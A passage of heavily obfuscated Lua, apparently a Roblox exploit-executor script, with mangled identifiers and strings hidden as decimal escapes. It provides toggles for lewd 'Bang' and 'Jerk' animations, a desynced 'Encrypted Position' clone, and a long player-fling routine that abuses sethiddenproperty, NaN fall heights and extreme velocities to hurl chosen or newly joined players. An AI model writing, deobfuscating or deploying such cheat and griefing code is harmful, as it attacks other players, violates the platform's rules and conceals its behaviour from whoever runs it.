 local _lIlIIIllIl = _IIllIIlIII:AddToggle("\084\111\103\066\097\110\103", { Text = "\066\097\110\103\032\065\110\105\109\097\116\105\111\110", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _lIIIIIIIII = _IlIllIIllI.BangSpeed and _IlIllIIllI.BangSpeed.Value if _lIIIIIIIII then _lIIIIIIIII.BANG.Speed = _lIIIIIIIII end
 else if _IlIllIIllI.KPBang then _IlIllIIllI.KPBang.Toggled = false end
 if _lIIIIIIIII.BANG.IsActive then _IIllIIIIII(_lIIIIIIIII.BANG) end
 end
 end
 , }) _lIlIIIllIl:AddKeyPicker("\075\080\066\097\110\103", { Default = "\080", Text = "\066\097\110\103\032\065\110\105\109", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _IIlIlIIlIl.TogBang.Value then _IlIllIIllI.KPBang.Toggled = false return end
 if _lIIlIIlIll() then return end
 _IIllIIIIII(_lIIIIIIIII.BANG) end
 , }) do local _IIIllIIIIl = _IIllIIlIII:AddDependencyBox() _IIIllIIIIl:AddSlider("\066\097\110\103\083\112\101\101\100", { Text = "\066\097\110\103\032\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x21, Min = 0x0, Max = 0x21, Rounding = 0x1, Callback = function (V) _lIIIIIIIII.BANG.Speed = V if _lIIIIIIIII.BANG.Track then _lIIIIIIIII.BANG.Track:AdjustSpeed(V) end
 end
 }) _IIIllIIIIl:SetupDependencies({{ _lIlIIIllIl, true }}) end
 local _lIllIIllll = _IIllIIlIII:AddToggle("\084\111\103\084\080\111\115\101", { Text = "\084\045\080\111\115\101", Default = false, Callback = function (_lIllIlIIll) if not _lIllIlIIll then if _IlIllIIllI.KPTPose then _IlIllIIllI.KPTPose.Toggled = false end
 if _lIllIIIIlI then _llllIIlIlI() end
 end
 end
 , }) _lIllIIllll:AddKeyPicker("\075\080\084\080\111\115\101", { Default = "\067", Text = "\084\045\080\111\115\101", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _IIlIlIIlIl.TogTPose.Value then _IlIllIIllI.KPTPose.Toggled = false return end
 if _lIIlIIlIll() then return end
 if getgenv().FUCActive then _IlIllIIllI.KPTPose.Toggled = _lIllIIIIlI return end
 if getgenv().InvisActive then getgenv()._invisSavedTPose = not (getgenv()._invisSavedTPose or false) return end
 if _IlIllIIllI.KPTPose.Toggled == _lIllIIIIlI then return end
 _llllIIlIlI() end
 , }) _llIIIIIllI:OnChanged( function (_lIllIlIIll) if _lllIIIIllI.HeadFloat then return end
 if _lIIlIIlIll() then _lllIIIIllI.HeadFloat = true _llIIIIIllI:SetValue( not _lIllIlIIll) _lllIIIIllI.HeadFloat = false return end
 if not _lIllIlIIll then local _IIIllIllIl = _IlIllIIllI and _IlIllIIllI.KPHeadFloat if _IIIllIllIl then _IIIllIllIl.Toggled = false end
 _llllIIIlIl() if _lIIIIIIIII.L_KEY.IsActive then _IIllIIIIII(_lIIIIIIIII.L_KEY) end
 end
 end
 ) _IllllIlIII:OnChanged( function (_lIllIlIIll) if _lllIIIIllI.Jerk then return end
 if _lIIlIIlIll() then _lllIIIIllI.Jerk = true _IllllIlIII:SetValue( not _lIllIlIIll) _lllIIIIllI.Jerk = false return end
 if not _lIllIlIIll then local _IIIllIllIl = _IlIllIIllI and _IlIllIIllI.KPJerk if _IIIllIllIl then _IIIllIllIl.Toggled = false end
 if _lIIIIIIIII.JERK.IsActive then _IIllIIIIII(_lIIIIIIIII.JERK) end
 end
 end
 ) _lIlIIIllIl:OnChanged( function (_lIllIlIIll) if _lllIIIIllI.Bang then return end
 if _lIIlIIlIll() then _lllIIIIllI.Bang = true _lIlIIIllIl:SetValue( not _lIllIlIIll) _lllIIIIllI.Bang = false return end
 if not _lIllIlIIll then local _IIIllIllIl = _IlIllIIllI and _IlIllIIllI.KPBang if _IIIllIllIl then _IIIllIllIl.Toggled = false end
 if _lIIIIIIIII.BANG.IsActive then _IIllIIIIII(_lIIIIIIIII.BANG) end
 end
 end
 ) _lIllIIllll:OnChanged( function (_lIllIlIIll) if _lllIIIIllI.TPose then return end
 if _lIIlIIlIll() then _lllIIIIllI.TPose = true _lIllIIllll:SetValue( not _lIllIlIIll) _lllIIIIllI.TPose = false return end
 if getgenv().InvisActive then getgenv()._invisSavedTPose = _lIllIlIIll return end
 if _lIllIlIIll and getgenv().FUCActive then _lllIIIIllI.TPose = true _lIllIIllll:SetValue(false) _lllIIIIllI.TPose = false return end
 if not _lIllIlIIll and _lIllIIIIlI then _llllIIlIlI() end
 end
 ) RunService.Heartbeat:Connect( function () if not getgenv().InvisActive then return end
 local _llIIIIllII = _lIIIIIIIII.TPOSE_A local _IlIIIlIlII = _lIIIIIIIII.F2_KEY if _llIIIIllII.Track and _llIIIIllII.Track.IsPlaying then pcall( function () _llIIIIllII.Track:Stop(0x0) end
 ) end
 if _IlIIIlIlII.Track and _IlIIIlIlII.Track.IsPlaying then pcall( function () _IlIIIlIlII.Track:Stop(0x0) end
 ) end
 if _lIllIIIIlI then if _lllIlIIIII then _lllIlIIIII:Disconnect() _lllIlIIIII = nil end
 _lIllIIIIlI = false end
 end
 ) task.spawn( function () while not _IllIIlIIll.Unloaded do task.wait(0.05) if _IllIIlIIll.Unloaded then break end
 if _lIIIIIIIII.L_KEY.IsActive then local _IlIIllIIlI = tick() while _lIIIIIIIII.L_KEY.IsActive and tick() - _IlIIllIIlI < 0x1 and not _IllIIlIIll.Unloaded do task.wait(0.05) end
 if _lIIIIIIIII.L_KEY.IsActive and not _IllIIlIIll.Unloaded and _IIlIlIIlIl.TogHeadFloat.Value then _IlIIlIllII() end
 while _lIIIIIIIII.L_KEY.IsActive and not _IllIIlIIll.Unloaded do task.wait(0.05) end
 _llllIIIlIl() end
 end
 _llllIIIlIl() end
 ) local function _lIlllIllIl(_lllIlIIIlI) if _lllIlIIIlI == "\077\066\049" then return _lIlIIlIlII:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) end
 if _lllIlIIIlI == "\077\066\050" then return _lIlIIlIlII:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) end
 local _lIIlIIIlII, result = pcall( function () return _lIlIIlIlII:IsKeyDown(Enum.KeyCode[_lllIlIIIlI]) end
 ) return _lIIlIIIlII and result or false end
 task.spawn( function () while not _IllIIlIIll.Unloaded do task.wait() if _IllIIlIIll.Unloaded then break end
 local _IIIllIllIl = _IlIllIIllI and _IlIllIIllI.KPHeadFloat local _lllIlIIIlI = _IIIllIllIl and _IIIllIllIl.Value or "\078\111\110\101" if _lllIlIIIlI ~= "\078\111\110\101" and _lIlllIllIl(_lllIlIIIlI) and _IIlIlIIlIl.TogHeadFloat.Value then local _IlllIIllll = tick() while _lIlllIllIl(_lllIlIIIlI) and _IIlIlIIlIl.TogHeadFloat.Value and not _IllIIlIIll.Unloaded do if _lIIlIIlIll() then task.wait(0.1) _lllIlIIIlI = (_IlIllIIllI and _IlIllIIllI.KPHeadFloat and _IlIllIIllI.KPHeadFloat.Value) or "\078\111\110\101" continue end
 if tick() - _IlllIIllll > 0.3 then _IIllIIIIII(_lIIIIIIIII.L_KEY) _IlIllIIllI.KPHeadFloat.Toggled = _lIIIIIIIII.L_KEY.IsActive task.wait(_IlllIIIllI) end
 task.wait() _lllIlIIIlI = (_IlIllIIllI and _IlIllIIllI.KPHeadFloat and _IlIllIIllI.KPHeadFloat.Value) or "\078\111\110\101" end
 end
 end
 end
 ) if _IllIlllllI[_lIIIlIIllI] then local _lllIllllIl = false _lIllllIIII = nil _FUCCloneRoot = nil _FUCCloneTrack = nil local _lIlIlIlIII = nil local _IllIlIlIII = 0x0 local _IlllIlllIl = nil local function _IIlIlIIlll(_IIllllIlII) if _IlllIlllIl then _IlllIlllIl:Disconnect() _IlllIlllIl = nil end
 if _lIllllIIII then pcall( function () _lIllllIIII:Destroy() end
 ) _lIllllIIII = nil end
 _FUCCloneRoot = nil _FUCCloneTrack = nil _lIlIlIlIII = nil _IllIlIlIII = 0x0 local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIlIIlIl and _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _llIIlIIlII or not _IlIIlIIlIl or not _IIIIlIIllI then return end
 local _IlIllIIlII = _IIllllIlII.Archivable _IIllllIlII.Archivable = true _lIllllIIII = _IIllllIlII:Clone() _IIllllIlII.Archivable = _IlIllIIlII _lIllllIIII.Parent = workspace _FUCCloneRoot = _lIllllIIII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIlIllIII = _lIllllIIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IlIIIlIllI = _IlIlIllIII and _IlIlIllIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _FUCCloneRoot then _FUCCloneRoot.Anchored = true _FUCCloneRoot.CFrame = CFrame.new(0x5F5E100, 0x5F5E100, 0x5F5E100) end
 local _IllllIIIIl = Instance.new("\072\105\103\104\108\105\103\104\116", _lIllllIIII) _IllllIIIIl.FillTransparency = 0.5 _IllllIIIIl.OutlineTransparency = 0x0 _IllllIIIIl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop _IllllIIIIl.FillColor = Color3.fromRGB(0x0, 0xFF, 0xFF) _IllllIIIIl.OutlineColor = Color3.fromRGB(0x0, 0xFF, 0xFF) _IllllIIIIl.Adornee = _lIllllIIII for _lllIlllIIl, _lIIIIIIIII in pairs(_lIllllIIII:GetDescendants()) do if _lIIIIIIIII:IsA("\066\097\115\101\080\097\114\116") and _lIIIIIIIII ~= _FUCCloneRoot then _lIIIIIIIII.CollisionGroup = "\117\110\116\111\117\099\104\097\098\108\101" _lIIIIIIIII.Massless = true _lIIIIIIIII.CanCollide = false _lIIIIIIIII.CanTouch = false _lIIIIIIIII.CanQuery = false _lIIIIIIIII.Transparency = 0.5 elseif _lIIIIIIIII:IsA("\084\114\097\105\108") or _lIIIIIIIII:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") then pcall( function () _lIIIIIIIII:Destroy() end
 ) elseif _lIIIIIIIII:IsA("\083\099\114\105\112\116") or _lIIIIIIIII:IsA("\076\111\099\097\108\083\099\114\105\112\116") then _lIIIIIIIII:Destroy() end
 end
 task.delay(0.1, function () if not _IlIIIlIllI or not _lIllllIIII then return end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\056\050\051\054\054\048\053\048\050\056" _FUCCloneTrack = _IlIIIlIllI:LoadAnimation(_llllIlIllI) _FUCCloneTrack.Priority = Enum.AnimationPriority.Action4 end
 ) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" _lIlIlIlIII = _IIIIlIIllI:LoadAnimation(_llllIlIllI) _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\056\050\051\054\054\048\053\048\050\056" _lIlIlIlIII.Priority = Enum.AnimationPriority.Action4 _IlllIlllIl = RunService.RenderStepped:Connect( function () if not _lIllllIIII or not _lIllllIIII.Parent then return end
 _IllIlIlIII = _IllIlIlIII + 0x1 if _lIlIlIlIII then if _lllIllllIl and not _lIlIlIlIII.IsPlaying then _lIlIlIlIII:Play() _lIlIlIlIII.Looped = true elseif _lIlIlIlIII.IsPlaying and ( not _lllIllllIl or _IllIlIlIII % 0x3E8 == 0x0) then _lIlIlIlIII:Stop() end
 _lIlIlIlIII:AdjustSpeed(0x1) end
 if _FUCCloneTrack and _FUCCloneRoot then if _lllIllllIl then local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then _FUCCloneRoot.CFrame = _IlIIIIIIll.CFrame end
 if not _FUCCloneTrack.IsPlaying then _FUCCloneTrack:Play() _FUCCloneTrack.Looped = true end
 else _FUCCloneRoot.CFrame = CFrame.new(0x5F5E100, 0x5F5E100, 0x5F5E100) if _FUCCloneTrack.IsPlaying then _FUCCloneTrack:Stop() end
 end
 _FUCCloneTrack:AdjustSpeed(0x1) end
 end
 ) end
 if _llIIIlIIll.Character then task.spawn(_IIlIlIIlll, _llIIIlIIll.Character) end
 local _lIlIIIlIll = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) _lllIllllIl = false getgenv().FUCActive = false pcall( function () if _IlIllIIllI.KPFUC then _IlIllIIllI.KPFUC.Toggled = false end
 end
 ) task.wait(0x1) _IIlIlIIlll(_IIllllIlII) end
 ) local _lllIlllIlI = _IIllIIlIII:AddToggle("\084\111\103\070\085\067", { Text = "\069\110\099\114\121\112\116\101\100\032\080\111\115\105\116\105\111\110", Default = false }) _IIllIIlIII:AddToggle("\084\111\103\072\097\110\100\079\102\102\115\101\116", { Text = "\072\097\110\100\032\079\102\102\115\101\116", Default = false, }) _lllIlllIlI:AddKeyPicker("\075\080\070\085\067", { Default = "\075", Text = "\069\110\099\114\121\112\116\101\100", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function (_IIIIIlIlll) if _IllllIllll.FC then return end
 if _IIIIIlIlll and not _IIlIlIIlIl.TogFUC.Value then RunService.RenderStepped:Wait() _IllllIllll.FC = true; _IlIllIIllI.KPFUC.Toggled = false; _IlIllIIllI.KPFUC:DoClick(); _IllllIllll.FC = false return end
 if _IIlIlIIlIl.TogFUC.Value and not _lIIlIIlIll() then if _IlIllIIllI.KPFUC.Toggled == _lllIllllIl then return end
 _lllIllllIl = not _lllIllllIl; getgenv().FUCActive = _lllIllllIl if _lllIllllIl then _lIIlIIllII(false, true) else _llIlIllIlI(false) end
 end
 end
 , }) _lllIlllIlI:OnChanged( function (_lIllIlIIll) if _lllIIIIllI.FUC then return end
 if _lIIlIIlIll() then _lllIIIIllI.FUC = true _lllIlllIlI:SetValue( not _lIllIlIIll) _lllIIIIllI.FUC = false return end
 if not _lIllIlIIll and _lllIllllIl then if _IlIllIIllI.KPFUC then _IlIllIIllI.KPFUC.Toggled = false end
 _lllIllllIl = false getgenv().FUCActive = false _llIlIllIlI(false) end
 end
 ) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.TogHeadFloat:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TogJerk:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TogBang:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TogTPose:SetValue(false) end
 ) end
 ) table.insert(_llIlllIlIl, function () if _lllIllllIl then _lllIllllIl = false getgenv().FUCActive = false pcall( function () _IIlIlIIlIl.TogFUC:SetValue(false) end
 ) end
 if _lIllllIIII then pcall( function () _lIllllIIII:Destroy() end
 ) _lIllllIIII = nil end
 _FUCCloneRoot = nil _FUCCloneTrack = nil _lIlIlIlIII = nil end
 ) end
 local function _llIllIIlII(_lllIIlllll) local _IIllllIlII = _lllIIlllll.Character if not _IIllllIlII then return false end
 local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _llIIlIIlII then return false end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIlIIlIl or _IlIIlIIlIl.Health <= 0x0 then return false end
 local _IIllIIIlIl = _llIIlIIlII.Position local _IIlIIIIlIl = getgenv().FPDH or workspace.FallenPartsDestroyHeight if _IIllIIIlIl.Y <= _IIlIIIIlIl + 0x64 then return false end
 if math.abs(_IIllIIIlIl.X) > 0x2710 or math.abs(_IIllIIIlIl.Z) > 0x2710 then return false end
 return true end
 local function _IIllIIIIlI(_lllIIlllll) local _IIllllIlII = _lllIIlllll and _lllIIlllll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") return _llIIlIIlII and _llIIlIIlII.Velocity.Magnitude >= 0x7D0 or false end
 local function _lIIIllllll(TargetPlayer) if not TargetPlayer or not TargetPlayer.Parent then return end
 local _IIIIllIllI = _llIIIlIIll.Character local _lIlIllllII = _IIIIllIllI and _IIIIllIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIIlIIll = _lIlIllllII and _lIlIllllII.RootPart local _llllIIllIl = TargetPlayer.Character if not _llllIIllIl then return end
 local _IlIIlIlllI = _llllIIllIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIllIIIIlI = _IlIIlIlllI and _IlIIlIlllI.RootPart local _llIIlIIlIl = _llllIIllIl:FindFirstChild("\072\101\097\100") local _lIIlIIIIlI = _llllIIllIl:FindFirstChildOfClass("\065\099\099\101\115\115\111\114\121") local _llIlIIIlIl = _lIIlIIIIlI and _lIIlIIIIlI:FindFirstChild("\072\097\110\100\108\101") if not (_IIIIllIllI and _lIlIllllII and _IIIIIlIIll) then _IllIIlIIll:Notify({ Title = _lIllIllIII("\070\108\105\110\103"), Content = "\089\111\117\114\032\099\104\097\114\097\099\116\101\114\032\105\115\032\110\111\116\032\114\101\097\100\121\046", _IllIIlIlll = 0x4 }) return end
 if _IlIIlIlllI and _IlIIlIlllI.Sit then _IllIIlIIll:Notify({ Title = _lIllIllIII("\070\108\105\110\103"), Content = TargetPlayer.Name .. "\032\105\115\032\099\117\114\114\101\110\116\108\121\032\115\101\097\116\101\100\046", _IllIIlIlll = 0x4 }) return end
 if not _llllIIllIl:FindFirstChildWhichIsA("\066\097\115\101\080\097\114\116") then return end
 if _IIIIIlIIll.Velocity.Magnitude < 0x32 then getgenv().OldPos = _IIIIIlIIll.CFrame end
 if _llIIlIIlIl then pcall( function () workspace.CurrentCamera.CameraSubject = _llIIlIIlIl end
 ) elseif _llIlIIIlIl then pcall( function () workspace.CurrentCamera.CameraSubject = _llIlIIIlIl end
 ) elseif _IlIIlIlllI then pcall( function () workspace.CurrentCamera.CameraSubject = _IlIIlIlllI end
 ) end
 local _lIlIIIllIl = _IlIllIIllI.CmdFlingMethod and _IlIllIIllI.CmdFlingMethod.Value or "\086\111\105\100" local _IlIlIlllll = _IlIllIIllI.FlingSpeed and _IlIllIIllI.FlingSpeed.Value or 0xF local _IIllIIlIII = _lIlIIIllIl == "\065\110\116\105\045\070\108\105\110\103" and -0.75 or (_lIlIIIllIl == "\078\111\114\109\097\108" and 0x0 or 0x1) local _IlIIlIlIll = _llIllllllI local _IIllIlIIIl = 0x0 local function _IllllllIIl(bp) return bp and bp.Parent ~= nil end
 local function _IllIlIIIll(basePart) if not _IlIIlIlIll then return end
 pcall( function () sethiddenproperty(_IIIIIlIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IIIIIlIIll.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIIIIlIIll.AssemblyAngularVelocity = Vector3.zero end
 ) if basePart and basePart.Parent then pcall( function () sethiddenproperty(basePart, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () basePart.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () basePart.AssemblyAngularVelocity = Vector3.zero end
 ) end
 end
 local _IlIIIlllII = function (BasePart) if not _IllllllIIl(BasePart) then return end
 local _IIllIIIlIl = BasePart.Position local _lIlllllIll = 0x0 pcall( function () _lIlllllIll = BasePart.Velocity.Magnitude end
 ) _IIllIlIIIl = _IIllIlIIIl + _IlIlIlllll local _lIllllllll = CFrame.new(0x0, _IIllIIlIII, 0x0) * CFrame.Angles(math.rad(0x5A), 0x0, math.rad(_IIllIlIIIl)) local _lIIlIlIIll = _IlIIlIlllI and _IlIIlIlllI.MoveDirection or Vector3.zero pcall( function () if _IlIIlIlIll then local _lIlIlIlIII = CFrame.new(_IIllIIIlIl) * _lIllllllll sethiddenproperty(_IIIIIlIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", BasePart) sethiddenproperty(BasePart, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIIIlIIll) _IIIIIlIIll.CFrame = _lIlIlIlIII else local _lIlIlIlIII = CFrame.new(_IIllIIIlIl) * _lIllllllll + _lIIlIlIIll * (_lIlllllIll / 1.25) _IIIIIlIIll.CFrame = _lIlIlIlIII _IIIIllIllI:SetPrimaryPartCFrame(_lIlIlIlIII) end
 _IIIIIlIIll.Velocity = Vector3.new(0x0, -9e9, 0x0) _IIIIIlIIll.RotVelocity = Vector3.new(9e8, 9e8, 9e8) end
 ) end
 local _llllllIIIl = function (BasePart) local _IllIIlIlll = tick() local _IIIllIlIII = _IlIllIIllI.FlingTimeout and _IlIllIIllI.FlingTimeout.Value or 0x3 pcall( function () _IlIIlIlllI.PlatformStand = true end
 ) repeat if not _IllllllIIl(BasePart) then break end
 if not _IlIIlIlllI or not _IlIIlIlllI.Parent then break end
 _IlIIIlllII(BasePart) task.wait() until _IllIIlIlll + _IIIllIlIII < tick() or not _IIllIlIlIl or not _IllllllIIl(BasePart) pcall( function () _IlIIlIlllI.PlatformStand = false end
 ) pcall( function () _IlIIlIlllI:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) _IllIlIIIll(BasePart) end
 workspace.FallenPartsDestroyHeight = 0x0/0x0 local _lIIIIlllll = Instance.new("\066\111\100\121\086\101\108\111\099\105\116\121") _lIIIIlllll.Parent = _IIIIIlIIll _lIIIIlllll.Velocity = Vector3.new(0x0, -9e12, 0x0) _lIIIIlllll.MaxForce = Vector3.new(0x0, -9e12, 0x0) _lIlIllllII:SetStateEnabled(Enum.HumanoidStateType.Seated, false) if _IIllIIIIlI and _IllllllIIl(_IIllIIIIlI) then pcall(_llllllIIIl, _IIllIIIIlI) elseif _llIIlIIlIl and _IllllllIIl(_llIIlIIlIl) then pcall(_llllllIIIl, _llIIlIIlIl) elseif _llIlIIIlIl and _IllllllIIl(_llIlIIIlIl) then pcall(_llllllIIIl, _llIlIIIlIl) else _IllIIlIIll:Notify({ Title = _lIllIllIII("\070\108\105\110\103"), Content = TargetPlayer.Name .. "\032\104\097\115\032\110\111\032\118\097\108\105\100\032\112\097\114\116\115\032\116\111\032\116\097\114\103\101\116\046", _IllIIlIlll = 0x4 }) _lIIIIlllll:Destroy() _lIlIllllII:SetStateEnabled(Enum.HumanoidStateType.Seated, true) return end
 pcall( function () _lIIIIlllll:Destroy() end
 ) pcall( function () _lIlIllllII:SetStateEnabled(Enum.HumanoidStateType.Seated, true) end
 ) pcall( function () _IIIIIlIIll.Velocity = Vector3.new() end
 ) pcall( function () _IIIIIlIIll.RotVelocity = Vector3.new() end
 ) pcall( function () workspace.CurrentCamera.CameraSubject = _lIlIllllII end
 ) if getgenv().OldPos then local _lllIIlIlII = tick() repeat pcall( function () _IIIIIlIIll.CFrame = getgenv().OldPos * CFrame.new(0x0, .0x5, 0x0) _IIIIllIllI:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0x0, .0x5, 0x0)) _lIlIllllII:ChangeState("\071\101\116\116\105\110\103\085\112") for _lllIlllIIl, _llIIIIlllI in pairs(_IIIIllIllI:GetChildren()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then _llIIIIlllI.Velocity = Vector3.new() _llIIIIlllI.RotVelocity = Vector3.new() end
 end
 end
 ) task.wait() until (_IIIIIlIIll.Position - getgenv().OldPos.p).Magnitude < 0x19 or tick() - _lllIIlIlII > 0x3 pcall( function () _IIIIIlIIll.Velocity = Vector3.new() end
 ) pcall( function () _IIIIIlIIll.RotVelocity = Vector3.new() end
 ) end
 end
 _lIIIlIlllI = function () end
 local function _IllIIIIlll() if not _lllIllllIl then return end
 local _lIlllIIlIl = _lIlIlllllI() flingPlayerCache = _lIlllIIlIl local _IlIllllIlI = {} for _IlIIIIIlll, _lllIlllIIl in pairs(_IlIIllIIII) do _IlIllllIlI[_IlIIIIIlll] = true end
 pcall( function () _lllIllllIl:SetValues(_lIlllIIlIl) _lllIllllIl:SetValue(_IlIllllIlI) end
 ) end
 local _llIlllIlIl = Players.PlayerAdded:Connect( function (joinedPlayer) task.wait(0.5) pcall(_IllIIIIlll) if _IIllIlIlIl and (_IllllllllI == "\097\108\108" or _IllllllllI == "\111\116\104\101\114\115") and joinedPlayer ~= _llIIIlIIll then task.spawn( function () task.wait(0x1) if _IIllIlIlIl and (_IllllllllI == "\097\108\108" or _IllllllllI == "\111\116\104\101\114\115") and _llIllIIlII(joinedPlayer) then _IlIIllIIII[_IllIlIlIII(joinedPlayer)] = joinedPlayer pcall(_IllIIIIlll) end
 end
 ) end
 end
 ) local _llIlIllIII = Players.PlayerRemoving:Connect( function () task.wait(0.1) pcall(_IllIIIIlll) end
 ) local function _llIIIlIIll(select) _IlIIllIIII = {} if select then for _lllIlllIIl, _IlIIIIIlll in ipairs(flingPlayerCache) do local _lllIIlllll = _llIIlllllI(_IlIIIIIlll) if _lllIIlllll then _IlIIllIIII[_IlIIIIIlll] = _lllIIlllll end
 end
 end
 if _lllIllllIl then local _lIIlllIIll = {} for _IlIIIIIlll, _lllIlllIIl in pairs(_IlIIllIIII) do _lIIlllIIll[_IlIIIIIlll] = true end
 pcall( function () _lllIllllIl:SetValue(_lIIlllIIll) end
 ) end
 end
 local function _IlIIlIlIlI() local _IIIIIlIIIl = 0x0 for _lllIlllIIl in pairs(_IlIIllIIII) do _IIIIIlIIIl = _IIIIIlIIIl + 0x1 end
 return _IIIIIlIIIl end
 local function _llIIIlllII() if _IIllIlIlIl then return end
 if _IlIIlIlIlI() == 0x0 then _IllIIlIIll:Notify({ Title = _lIllIllIII("\070\108\105\110\103"), Content = "\078\111\032\116\097\114\103\101\116\115\032\115\101\108\101\099\116\101\100\046", _IllIIlIlll = 0x4 }) return end
 _IIllIlIlIl = true if _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") then _llIIllIIIl = _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100").Died:Connect( function () if _IIllIlIlIl then _IIllIlIlIl = false _IllIlIIIII() if _llIIllIIIl then _llIIllIIIl:Disconnect() _llIIllIIIl = nil end
 end
 end
 ) end
 task.spawn( function () local _lIIlIlllII = Players.PlayerRemoving:Connect( function (removedPlayer) local _IllllIllII = _IllIlIlIII(removedPlayer) if _IlIIllIIII[_IllllIllII] then _IlIIllIIII[_IllllIllII] = nil pcall( function () local _IIlIIlIIIl = workspace.CurrentCamera.CameraSubject if _IIlIIlIIIl and removedPlayer.Character and _IIlIIlIIIl:IsDescendantOf(removedPlayer.Character) then _IlIIIlllII() _IIlllllIll = false pcall( function () workspace.CurrentCamera.CameraSubject = _llIIIlIIll.Character end
 ) end
 end
 ) if next(_IlIIllIIII) == nil then _IIllIlIlIl = false end
 end
 end
 ) local _IIlIIIlllI = nil local _IIIllIIlII = {} local _lllllIlllI = 0x0 local function _IllIllIlll() local _llIIIllIlI = {} for _lllIlllIIl, _llllIIllll in ipairs(_IIIllIIlII) do _llIIIllIlI[_llllIIllll] = true end
 for _IlIIIIIlll, _lllIlllIIl in pairs(_IlIIllIIII) do if not _llIIIllIlI[_IlIIIIIlll] then table.insert(_IIIllIIlII, _IlIIIIIlll) end
 end
 for _lIlllIlIll = #_IIIllIIlII, 0x1, -0x1 do if not _IlIIllIIII[_IIIllIIlII[_lIlllIlIll]] then table.remove(_IIIllIIlII, _lIlllIlIll) if _lllllIlllI >= _lIlllIlIll then _lllllIlllI = math.max(0x0, _lllllIlllI - 0x1) end
 end
 end
 end
 local function _lIlIlIllIl() _IIIllIIlII = {} _lllllIlllI = 0x0 end
 local function _IllIIIllIl(_IIIlIlIlll) _IllIllIlll() local _llIIlIIllI = #_IIIllIIlII if _llIIlIIllI == 0x0 then return nil end
 for _lIlIIIlIlI = 0x1, _llIIlIIllI do local _lIllIIIIII = (_lllllIlllI + _lIlIIIlIlI - 0x1) % _llIIlIIllI + 0x1 local _IlIIIIIlll = _IIIllIIlII[_lIllIIIIII] local _IIIIIlIlll = _IIIlIlIlll[_IlIIIIIlll] if _IIIIIlIlll and _llIllIIlII(_IIIIIlIlll) and not _IIllIIIIlI(_IIIIIlIlll) then _lllllIlllI = _lIllIIIIII return _IIIIIlIlll end
 end
 return nil end
 while _IIllIlIlIl do local _IIIlIlIlll = {} for _IlIIIIIlll, _lllIIlllll in pairs(_IlIIllIIII) do if _lllIIlllll and _lllIIlllll.Parent then _IIIlIlIlll[_IlIIIIIlll] = _lllIIlllll else _IlIIllIIII[_IlIIIIIlll] = nil end
 end
 local _IlIlIIlIlI = _IllIIIllIl(_IIIlIlIlll) if next(_IIIlIlIlll) == nil then if _IIlllllIll and not _IlIIlIlIII then _IllIlIIIII() _IIlllllIll = false _IIlIIIlllI = nil end
 _IIllIlIlIl = false break elseif not _IlIlIIlIlI then if _IIlllllIll and not _IlIIlIlIII then _IllIlIIIII() _IIlllllIll = false _IIlIIIlllI = nil end
 task.wait(0.2) else local _lllIIlllll = _IlIlIIlIlI if not _IlIIlIlIII and _IIlIIIlllI ~= _lllIIlllll then _lIlIIIIlIl(_lllIIlllll) _IIlllllIll = true _IIlIIIlllI = _lllIIlllll end
 if not _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] then _lIIIllIlll() end
